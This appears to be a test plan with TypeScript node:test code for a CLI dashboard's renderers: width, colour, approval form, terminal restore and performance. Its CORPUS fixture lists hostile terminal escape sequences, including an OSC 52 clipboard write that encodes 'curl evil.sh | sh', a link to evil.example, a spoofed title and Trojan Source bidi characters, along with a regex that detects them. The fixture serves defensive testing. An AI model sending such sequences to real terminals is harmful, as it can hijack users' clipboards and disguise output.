# Automatable tests

Repository style: `node:test` + `node:assert/strict`, `.test.ts` files run by Node's type stripping, Gherkin scenarios
in `features/` driving the real CLI. The names below (`renderHome`, `renderDashboard`, `approvalForm`, `withTerminal`)
are the shape to aim for — adapt them to the code you write. Every renderer is pure, so most tests need no terminal.

## Shared fixtures

```ts
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { displayWidth } from '../src/i18n/width.ts';

const ESC = /\x1b/g;
const SGR = /\x1b\[[0-9;]*m/g;                       // the renderer's own colour codes
const FORBIDDEN = /[\u0000-\u0008\u000b-\u001f\u007f-\u009f\u00ad\u061c\u180e\u200b\u200e\u200f\u2028-\u202e\u2060-\u2064\u2066-\u2069\ufeff]|[\u{e0000}-\u{e007f}]/u;
const caps = (o: Partial<Caps> = {}): Caps => ({ columns: 100, rows: 30, color: 24, charset: 'utf8', theme: 'dark', motion: false, now: Date.parse('2026-11-22T10:24:13Z'), ...o });

/** Strings an agent, a file name or a provider could send. Each one must come out inert and marked. */
export const CORPUS = [
  'ok\u001b[2J\u001b[Hcleared',                      // clear screen + home
  'tests FAILED\r\u001b[32mtests PASSED\u001b[0m',  // carriage return overwrite
  '\u001b]52;c;Y3VybCBldmlsLnNoIHwgc2g=\u0007copy',  // clipboard write (OSC 52)
  '\u001b]8;;https://evil.example\u001b\\docs\u001b]8;;\u001b\\', // hyperlink
  '\u001b]0;root@prod\u0007title',                   // window title
  'answer me\u001b[c\u001b[6n\u001b[21t',            // terminal queries: replies land on stdin
  '\u001bP+q544e\u001b\\dcs', '\u001b_apc\u001b\\',   // DCS, APC
  '\u009b31mC1 CSI\u009b0m', '\u009d0;t\u009c',       // 8-bit C1
  'if (isAdmin) {\u202e } \u2066// check\u2069',      // bidi override / isolate (Trojan Source)
  'pass\u200bword', '\ufeffBOM', 'tag\u{e0041}',      // invisible characters
  'bell\u0007', 'back\bspace', 'del\u007f',
  'src/\u001b[31mevil.js',                            // a file name
  '为登录页面添加速率限制', 'مرحبا بالعالم', 'नमस्ते\u200dदुनिया',      // legitimate text must survive
];
```

## T1 — width (AC-1)

`displayWidth` cannot check itself: pair the property test with fixtures whose width was counted by hand (and, once,
in a real terminal) — `'为登录'` = 6, `'é'` (precomposed) = 1, `'e' + U+0301` = 1, `'‹ESC›'` = 5.

```ts
for (const lang of ['en', 'fr', 'ja', 'ar']) for (const columns of [40, 60, 80, 100, 120, 200]) {
  test(`home fits ${columns} columns in ${lang}`, () => {
    const lines = withLanguage(lang, () => renderHome(sampleHome(), caps({ columns })));
    for (const [i, l] of lines.entries()) assert.ok(displayWidth(l) <= columns, `line ${i}: ${displayWidth(l)} > ${columns}`);
  });
}
test('dashboard returns exactly `rows` lines', () => {
  for (const [columns, rows] of [[40, 12], [80, 20], [120, 34], [200, 60]]) assert.equal(renderDashboard(sampleRun(), caps({ columns, rows })).length, rows);
});
```

## T2 — no colour, same meaning (AC-2, AC-3)

```ts
test('NO_COLOR: zero colour codes, every state still readable', () => { // renderers return content; cursor codes belong to the terminal layer
  const frame = renderHome(homeWithEveryState(), caps({ color: 0 })).join('\n');
  assert.equal((frame.match(ESC) ?? []).length, 0);
  for (const [glyph, word] of [['●', 'READY'], ['○', 'NOT READY'], ['◐', 'READY'], ['◆', '']]) assert.ok(frame.includes(glyph) && frame.includes(word));
});
test('not a TTY: no spinner frames and no cursor moves', () => {
  const r = spawnSync(process.execPath, [CLI, 'status'], { encoding: 'utf8', env: { ...process.env, NO_COLOR: '' } });
  assert.doesNotMatch(r.stdout, /\x1b\[|[⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏]/);
});
```

## T3 — untrusted text (AC-4)

```ts
test('every corpus string is inert and marked in every sink', () => {
  for (const evil of CORPUS) for (const sink of SINKS) {          // reason, event line, artifact, file name, model label…
    const frame = sink.render(evil, caps()).join('\n').replace(SGR, '');
    assert.doesNotMatch(frame, FORBIDDEN, `${sink.name}: ${JSON.stringify(evil)}`);
  }
});
test('ZWJ survives in logs only', () => {
  assert.equal(neutralize('नमस्ते\u200dदुनिया', { profile: 'log' }).marked, 0);
  assert.equal(neutralize('नमस्ते\u200dदुनिया').marked, 1);
});
test('no literal control, bidi or invisible character in the sources', () => {
  for (const f of trackedSourceFiles()) assert.doesNotMatch(readFileSync(f, 'utf8'), FORBIDDEN, f); // FORBIDDEN is written with \u escapes
});
test('legitimate scripts survive untouched', () => {
  for (const ok of ['为登录页面添加速率限制', 'مرحبا بالعالم']) assert.equal(neutralize(ok).text, ok);
});
test('the count is shown', () => {
  const frame = renderEvents([event('implementer: \u001b]52;c;eA==\u0007x')], caps()).join('\n');
  assert.match(frame, /‹ESC›\]52/); assert.match(frame, /1 terminal sequence neutralised|neutralis/);
});
test('--json stays byte-identical', () => { /* run `taskquoin status --json` before/after the change on a seeded run */ });
```

## T4 — the approval contract (AC-5, AC-6)

```ts
function harness(binding = '9c1e04b7aa31d2f04c11aa0b3e2e5f9d8c7b6a51') {
  const calls: unknown[] = []; let current = binding;
  const form = approvalForm({ runId: 'ab12cd', gate: 'commit', approver: 'alice (via taskquoin dashboard)',
    pending: () => ({ gate: 'commit', binding: current }),
    approve: async (...a: unknown[]) => { calls.push(a); return 0; } });
  return { form, calls, change: (b: string) => { current = b; } };
}
test('no single key approves', async () => {
  const { form, calls } = harness();
  for (const k of ['y', 'Y', '\r', ' ', 'a', '\u001b']) await form.key(k);
  assert.equal(calls.length, 0);
});
test('an Enter inside a pasted chunk never submits', async () => {
  const { form, calls } = harness(); form.open();
  await form.key('9c1e04b7aa31\r');                          // one chunk = a paste
  assert.equal(calls.length, 0);
});
test('keys typed before the form appeared are discarded', async () => {
  const { form, calls } = harness();
  form.typeAhead('9c1e04b7aa31\r');                               // buffered before open()
  form.open(); await form.key('\r');
  assert.equal(calls.length, 0);
});
test('the binding is re-read after the last keystroke', async () => {
  const { form, calls, change } = harness(); form.open();
  for (const k of '9c1e04b7aa3') await form.key(k);
  change('77d0e2c41f95aa00000000000000000000000000'); await form.key('1'); await form.key('\r');
  assert.equal(calls.length, 0); assert.match(form.render(caps()).join('\n'), /changed since it was shown/);
});
test('retyping the shown hash approves exactly once, through the existing function', async () => {
  const { form, calls } = harness(); form.open();
  for (const k of '9c1e04b7aa31\r') await form.key(k);
  // what the human typed (the 12-character prefix) goes to approve, exactly as the console passes it
  assert.deepEqual(calls, [['ab12cd', 'commit', '9c1e04b7aa31', 'alice (via taskquoin dashboard)']]);
});
```

Console flows keep their Gherkin scenarios (`features/console.feature`): add one per new screen with piped input,
including a wrong hash and an empty line.

## T5 — honest states (AC-7, AC-8)

```ts
test('READY count equals gate ok count, whatever the verdicts', () => {
  for (let seed = 0; seed < 200; seed++) {
    const squad = randomSquad(seed);                             // ok / refused / accepted risk / runtime absent
    const frame = renderHome({ ...sampleHome(), squad }, caps({ color: 0 })).join('\n');
    assert.equal((frame.match(/(?<!NOT )READY/g) ?? []).length, squad.filter(m => m.gate.ok).length);
  }
});
test('no invented progress', () => {
  const frame = renderDashboard(runWithoutTotals(), caps({ columns: 120, rows: 34 })).join('\n');
  assert.doesNotMatch(frame.replace(SGR, ''), /\d+\s?%|[█▓▒]{2,}[░─ ]{2,}|━{2,}─{2,}/);
});
test('unknown model is shown as unknown', () => {
  assert.match(renderAgents([{ role: 'Developer', runtime: 'claude', model: undefined }], caps()).join('\n'), /\?/);
});
```

The `%` test excludes real ratios: give the diff viewer's "12 %" its own test with a model that has `done/total`.

## T6 — the terminal is given back (AC-9)

```ts
test('restore on every exit path', async () => {
  for (const how of ['return', 'throw', 'SIGINT', 'SIGTERM', 'SIGHUP']) {
    const io = fakeTty(); const proc = new EventEmitter();
    const run = withTerminal(io, proc, async () => { if (how === 'throw') throw new Error('x'); if (how.startsWith('SIG')) proc.emit(how); });
    await run.catch(() => {});
    const tail = io.writes.join('');
    assert.ok(tail.lastIndexOf('\x1b[?25h') > tail.lastIndexOf('\x1b[?25l'), how);
    assert.ok(!tail.includes('\x1b[?1049h') || tail.lastIndexOf('\x1b[?1049l') > tail.lastIndexOf('\x1b[?1049h'), how);
    assert.equal(io.rawMode, false, how);
  }
});
```

End to end in a real pseudo-terminal (Linux CI): `script -qfec "taskquoin dashboard" /dev/null` with a `q` on stdin,
then assert the capture ends with `?25h` and `?1049l`.

## T7 — read-only and robust reads (AC-10, AC-14)

```ts
test('a dashboard session changes nothing in the control store', () => {
  const before = treeHash(STORE);
  const r = spawnSync(process.execPath, ['--permission', `--allow-fs-read=*`, DASHBOARD_SCRIPT, '--replay', KEYS], { encoding: 'utf8', env });
  assert.equal(r.status, 0, r.stderr);                            // any write or child process throws ERR_ACCESS_DENIED
  assert.equal(treeHash(STORE), before);
});
test('partial and malformed event lines are skipped and counted', () => {
  writeFileSync(events, '{"type":"node.transition","node":"plan"}\n{"type":"verify.res');   // partial last line
  appendFileSync(events, '\nnot json\n');
  const r = readEvents(events);
  assert.equal(r.events.length, 1); assert.equal(r.skipped, 2);
});
```

Measured on Node 22.22: `--permission --allow-fs-read=*` makes `writeFileSync` and `execSync` throw `ERR_ACCESS_DENIED`.
The initial host probe starts processes: run it before entering the read-only part, or inject its result.

## T8 — performance (AC-11 – AC-13, AC-15)

```ts
test('one 120 × 40 frame under 5 ms with 10 000 events', () => {
  const model = modelWithEvents(10_000); const t: number[] = [];
  for (let i = 0; i < 200; i++) { const s = performance.now(); renderDashboard(model, caps({ columns: 120, rows: 40 })); t.push(performance.now() - s); }
  assert.ok(t.sort((a, b) => a - b)[189] < 5);
});
test('bounded buffer', () => { const b = eventBuffer(1000); for (let i = 0; i < 100_000; i++) b.push(event(`${i}`)); assert.equal(b.size, 1000); });
test('idle writes nothing', async () => { const io = fakeTty(); const d = startDashboard(io, staticStore()); await sleep(5000); assert.equal(io.framesAfterFirst(), 0); d.stop(); });
```

## T9 — contrast and language (AC-16, AC-17)

```ts
test('tokens meet WCAG contrast', () => {
  for (const [theme, bg] of [['dark', '#1A1B26'], ['light', '#FFFFFF']] as const) {
    for (const t of TEXT_TOKENS) assert.ok(contrast(TOKENS[theme][t], bg) >= 4.5, `${theme}.${t}`);
    assert.ok(contrast(TOKENS[theme].line, bg) >= 3, `${theme}.line`);
  }
});
```

Language: extend `apps/cli/test/i18n-catalogs.test.ts` with the new keys; the existing catalog test fails on a missing
key in any of the 22 languages.
